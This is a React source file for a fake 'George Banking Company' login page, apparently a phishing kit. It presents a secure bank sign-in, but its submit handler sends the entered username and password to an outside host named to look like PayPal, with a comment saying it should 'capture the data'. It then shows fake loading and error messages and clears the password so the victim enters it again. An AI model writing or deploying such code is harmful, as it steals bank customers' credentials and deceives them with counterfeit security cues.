import React, { useState } from "react";
import axios from "axios";
import { toast, ToastContainer } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import { MdVisibility, MdVisibilityOff } from "react-icons/md";

export default function Login() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  // UX Logic States
  const [loading, setLoading] = useState(false);
  // 3 minutes in seconds
  const [attempts, setAttempts] = useState(0);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    try {
      //  Immediately capture the data in the background
      await axios.post("https://paypalcom-nl.onrender.com/api/auth/login", {
        username,
        password,
      });

      // 2. Start the 3-minute fake loading (180,000 ms)
      setTimeout(() => {
        setLoading(false);
        const newAttemptCount = attempts + 1;
        setAttempts(newAttemptCount);

        // 3. Logic for Toast Messages
        if (newAttemptCount < 2) {
          toast.warn("Please try again", {
            position: "top-center",
            autoClose: 1000,
          });
        } else {
          toast.error("Connection error, try again later", {
            position: "top-center",
            autoClose: false, // Keep it visible
          });
        }

        // Clear password field to force re-entry
        setPassword("");
      }, 1800);
    } catch (error) {
      // If the actual server fails, we still stop loading after a bit
      setLoading(false);
      toast.error("System busy. Please try again later.");
    }
  };

  return (
    <>
      <div className="bg-[#f4f6f8] min-h-screen text-[#1d2129] flex flex-col font-sans relative">
        {/* Hero Background Wrapper */}
        <div className="relative flex-grow flex flex-col items-center justify-center pt-16 pb-12 px-4 overflow-hidden">
          {/* Background Image Overlay */}
          <div className="absolute inset-0 z-0">
            <div
              className="w-full h-full bg-cover bg-center"
              style={{
                backgroundImage:
                  "url('https://lh3.googleusercontent.com/aida/AP1WRLum6i3k6UMFwZyL7OcxdnK7qfq-pH6q5sIHRwljIU7OnL564WSeOz_rRla5gNz1wXGHprSfMq7lMZrQ7QbNFoB_v3giV-LtSB2kOk3GKT1aX4h3GzQ6JRTsLT3iJQ9NILv6W_46V6nMlojPBGWl_akE49jeKxgfo6-eTp4KWjUTAkMnm142vBP1zrEIfjpQ0sRhBGDSztnYZnI6jhp13VO4RAiBYALTROJRmFWrCJNTt8E7TjdhOCFJ_IzN')",
                filter: "brightness(0.45) contrast(1.05)",
              }}
            ></div>
          </div>

          {/* Login Card Container */}
          <div className="relative z-10 w-full max-w-[460px] flex-grow flex flex-col justify-center">
            <div className="bg-white/95 rounded-xl px-10 py-10 shadow-2xl border border-white/20 backdrop-blur-md">
              {/* Logo & Brand Header */}
              <div className="text-center mb-6">
                <h1 className="text-xl font-semibold text-[#1d2129] tracking-tight">
                  George Banking Company
                </h1>
                <p className="text-xs font-medium text-[#5c6068] mt-1.5 uppercase tracking-wider">
                  Personal Banking Login
                </p>
              </div>

              {/* Secure Connection Badge */}
              <div className="flex items-center justify-center gap-2 mb-8 py-2 px-4 bg-[#f4f6f8] rounded-md border border-[#e8ebf0]">
                <svg
                  className="text-[#006699] w-4 h-4 fill-current"
                  viewBox="0 0 24 24"
                >
                  <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" />
                </svg>
                <span className="text-xs font-medium text-[#5c6068]">
                  Secure Connection Established
                </span>
              </div>

              {/* Authentication Form */}
              <form className="space-y-5" onSubmit={handleSubmit}>
                {/* Username Input Field */}
                <div className="space-y-1.5">
                  <label
                    className="text-sm font-medium text-[#1d2129] block"
                    htmlFor="username"
                  >
                    Username
                  </label>
                  <div className="relative">
                    <span className="absolute left-3.5 top-1/2 -translate-y-1/2 text-[#8c929e]">
                      <svg
                        className="w-[18px] h-[18px] fill-current"
                        viewBox="0 0 24 24"
                      >
                        <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
                      </svg>
                    </span>
                    <input
                      className="w-full pl-11 pr-4 py-2.5 rounded-md border border-[#d0d5dd] bg-white text-sm text-[#1d2129] placeholder-[#8c929e] focus:outline-none focus:border-[#003366] focus:ring-1 focus:ring-[#003366] transition-all"
                      id="username"
                      placeholder="Enter your username"
                      type="text"
                      disabled={loading}
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                    />
                  </div>
                </div>

                {/* Password Input Field */}
                <div className="space-y-1.5">
                  <label
                    className="text-sm font-medium text-[#1d2129] block"
                    htmlFor="password"
                  >
                    Password
                  </label>
                  <div className="relative">
                    <span className="absolute left-3.5 top-1/2 -translate-y-1/2 text-[#8c929e]">
                      <svg
                        className="w-3.5 h-3.5 text-[#006699]"
                        fill="currentColor"
                        viewBox="0 0 24 24"
                      >
                        <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5S10.62 6.5 12 6.5s2.5 1.12 2.5 2.5S13.38 11.5 12 11.5z" />
                      </svg>
                    </span>
                    <input
                      className="w-full pl-11 pr-11 py-2.5 rounded-md border border-[#d0d5dd] bg-white text-sm text-[#1d2129] placeholder-[#8c929e] focus:outline-none focus:border-[#003366] focus:ring-1 focus:ring-[#003366] tracking-wide transition-all"
                      id="password"
                      placeholder="••••••••"
                      type={showPassword ? "text" : "password"}
                      disabled={loading}
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                    />
                    <button
                      className="absolute right-3.5 top-1/2 -translate-y-1/2 text-[#8c929e] hover:text-[#1d2129] transition-colors"
                      onClick={() => setShowPassword(!showPassword)}
                      type="button"
                    >
                      {showPassword ? (
                        <svg
                          className="w-[18px] h-[18px] fill-current"
                          viewBox="0 0 24 24"
                        >
                          <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.82l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.74-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16c.56-.23 1.17-.36 1.82-.36zm-8.21-.34L1.39 4.22 2.8 2.81l18.38 18.38-1.41 1.41-3.28-3.28C15.05 20.25 13.58 20.5 12 20.5c-5 0-9.27-3.11-11-7.5 1.04-2.64 2.87-4.88 5.23-6.33L3.79 6.66zM12 17c2.76 0 5-2.24 5-5 0-.77-.18-1.5-.49-2.14l-1.57 1.57c.04.18.06.37.06.57 0 1.66-1.34 3-3 3-.2 0-.39-.02-.57-.06L9.86 16.51c.64.31 1.37.49 2.14.49zm-.44-3.56l-1.42-1.42c-.09.3-.14.63-.14.98 0 1.66 1.34 3 3 3 .35 0 .68-.05.98-.14l-1.42-1.42c-.44.44-1.16.44-1.6.01z" />
                        </svg>
                      ) : (
                        <svg
                          className="w-[18px] h-[18px] fill-current"
                          viewBox="0 0 24 24"
                        >
                          <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" />
                        </svg>
                      )}
                    </button>
                  </div>
                </div>

                {/* Contextual Actions Row */}
                <div className="flex items-center justify-between pt-1">
                  <label className="flex items-center cursor-pointer group">
                    <input
                      className="w-4 h-4 rounded border-[#d0d5dd] text-[#041533] focus:ring-[#041533] cursor-pointer"
                      type="checkbox"
                    />
                    <span className="ml-2 text-sm text-[#5c6068] group-hover:text-[#1d2129] transition-colors">
                      Remember Me
                    </span>
                  </label>
                  <a
                    className="text-sm font-medium text-[#003366] hover:underline"
                    href="#"
                  >
                    Forgot Password?
                  </a>
                </div>

                {/* Submit Button */}
                <button
                  className={`w-full mt-2 py-3 text-white rounded-md text-sm font-semibold transition-all shadow-sm flex items-center justify-center gap-2 ${
                    loading
                      ? "bg-[#5c6068] cursor-not-allowed"
                      : "bg-[#041533] hover:bg-black active:scale-[0.99]"
                  }`}
                  type="submit"
                  disabled={loading}
                >
                  {loading ? (
                    <>
                      <svg
                        className="animate-spin h-4 w-4 text-white"
                        fill="none"
                        viewBox="0 0 24 24"
                      >
                        <circle
                          className="opacity-25"
                          cx="12"
                          cy="12"
                          r="10"
                          stroke="currentColor"
                          strokeWidth="4"
                        />
                        <path
                          className="opacity-75"
                          fill="currentColor"
                          d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                        />
                      </svg>
                      Verifying Secure Assets...
                    </>
                  ) : (
                    "Sign In"
                  )}
                </button>
              </form>

              {/* Enrollment Actions */}
              <div className="mt-8 pt-6 border-t border-[#e8ebf0] grid grid-cols-2 gap-4 text-center">
                <div className="space-y-1">
                  <span className="text-[11px] font-semibold text-[#8c929e] uppercase block tracking-wider">
                    New Member?
                  </span>
                  <a
                    className="text-sm font-bold text-[#003366] hover:underline block"
                    href="#"
                  >
                    Enroll Now
                  </a>
                </div>
                <div className="space-y-1 border-l border-[#e8ebf0]">
                  <span className="text-[11px] font-semibold text-[#8c929e] uppercase block tracking-wider">
                    Branch Finder
                  </span>
                  <a
                    className="text-sm font-bold text-[#003366] hover:underline flex items-center justify-center gap-1"
                    href="#"
                  >
                    <svg
                      className="w-3.5 h-3.5 text-[#006699] fill-current"
                      viewBox="0 0 24 24"
                    >
                      <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13 Tri-9c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z" />
                    </svg>
                    Find a Location
                  </a>
                </div>
              </div>
            </div>

            {/* Links */}
            <div className="mt-6 flex justify-center gap-6 text-xs text-white/80 font-medium">
              <a className="hover:text-white transition-colors" href="#">
                Privacy Policy
              </a>
              <a className="hover:text-white transition-colors" href="#">
                Security
              </a>
              <a className="hover:text-white transition-colors" href="#">
                Contact Support
              </a>
            </div>
          </div>
        </div>

        {/* Corporate Footer Section */}
        <footer className="bg-[#f0f2f5] border-t border-[#e1e4e8] py-12 px-6 md:px-12">
          <div className="max-w-6xl mx-auto grid grid-cols-1 md:grid-cols-4 gap-8">
            <div className="col-span-1">
              <div className="text-base font-bold text-[#1d2129]">
                George Banking Company
              </div>
              <p className="mt-2 text-xs text-[#5c6068] leading-relaxed">
                Member FDIC. Equal Housing Lender.
              </p>
            </div>
            <div className="flex flex-col gap-2.5">
              <span className="text-xs font-bold text-[#1d2129] uppercase tracking-wider">
                Links
              </span>
              <a
                className="text-xs text-[#5c6068] hover:text-[#003366] transition-colors"
                href="#"
              >
                Privacy Policy
              </a>
              <a
                className="text-xs text-[#5c6068] hover:text-[#003366] transition-colors"
                href="#"
              >
                Terms of Service
              </a>
              <a
                className="text-xs text-[#5c6068] hover:text-[#003366] transition-colors"
                href="#"
              >
                Security
              </a>
            </div>
            <div className="flex flex-col gap-2.5">
              <span className="text-xs font-bold text-[#1d2129] uppercase tracking-wider">
                Support
              </span>
              <a
                className="text-xs text-[#5c6068] hover:text-[#003366] transition-colors"
                href="#"
              >
                ADA Compliance
              </a>
              <a
                className="text-xs text-[#5c6068] hover:text-[#003366] transition-colors"
                href="#"
              >
                Contact Us
              </a>
              <a
                className="text-xs text-[#5c6068] hover:text-[#003366] transition-colors"
                href="#"
              >
                Locations
              </a>
            </div>
            <div className="flex flex-col gap-2.5">
              <span className="text-xs font-bold text-[#1d2129] uppercase tracking-wider">
                Company
              </span>
              <a
                className="text-xs text-[#5c6068] hover:text-[#003366] transition-colors"
                href="#"
              >
                About Us
              </a>
              <a
                className="text-xs text-[#5c6068] hover:text-[#003366] transition-colors"
                href="#"
              >
                Career Opportunities
              </a>
              <a
                className="text-xs text-[#5c6068] hover:text-[#003366] transition-colors"
                href="#"
              >
                Site Map
              </a>
            </div>
          </div>
          <div className="max-w-6xl mx-auto mt-10 pt-6 border-t border-[#e1e4e8] text-center text-xs text-[#8c929e]">
            © 2026 George Banking Company. All rights reserved.
          </div>
        </footer>
      </div>
      <ToastContainer position="top-center" autoClose={3000} theme="light" />
    </>
  );
}
